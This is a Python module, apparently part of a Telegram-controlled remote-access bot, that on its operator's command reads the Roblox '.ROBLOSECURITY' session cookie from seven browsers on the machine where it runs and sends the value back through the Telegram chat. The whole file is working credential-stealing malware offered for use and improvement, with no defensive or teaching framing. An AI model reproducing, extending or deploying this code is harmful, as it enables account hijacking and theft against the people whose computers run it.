##  _________________________________________
##   |_______  authors: Eks1azy  _______| 
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\                    
##  ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy   / /
##  |                                        / / 
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/

# forked from https://github.com/cybermads/Letrium.git
# author: cyberman

from aiogram import types, F
from aiogram.filters import Command
from config import ALLOWED_USER_ID
from lib.texts import TEXTS, user_languages

import browser_cookie3

PATHS = ["chrome", "edge", "firefox", "brave", "opera", "vivaldi", "chromium"]

 
def register_roblosecurity_handler(dp):
    @dp.message(F.text.casefold().in_({"роблокс куки", "roblox cookie"}))
    @dp.message(Command("robloxcookie"))
    async def robloxcookie(message: types.Message):
        user_id = message.from_user.id
        text = message.text.casefold()

        # Определяем язык по команде
        if text == "роблокс куки":
            lang = 'ru'
        else:
            lang = user_languages.get(user_id, 'en')

        texts = TEXTS[lang]

        if user_id != ALLOWED_USER_ID:
            await message.answer(texts["no_access"])
            return

        await message.answer(texts.get("robloxcookie_start", "Ищу ROBLOSECURITY куки..."))

        found = False
        for local in PATHS:
            try:
                cookies = getattr(browser_cookie3, local)(domain_name='roblox.com')
                for cookie in cookies:
                    if cookie.name == '.ROBLOSECURITY':
                        await message.answer(f"ROBLOSECURITY: `{cookie.value}`", parse_mode="Markdown")
                        found = True
                        break
                if found:
                    break
            except Exception:
                continue

        if not found:
            await message.answer(texts.get("robloxcookie_not_found", "Не удалось найти ROBLOSECURITY куки."))
        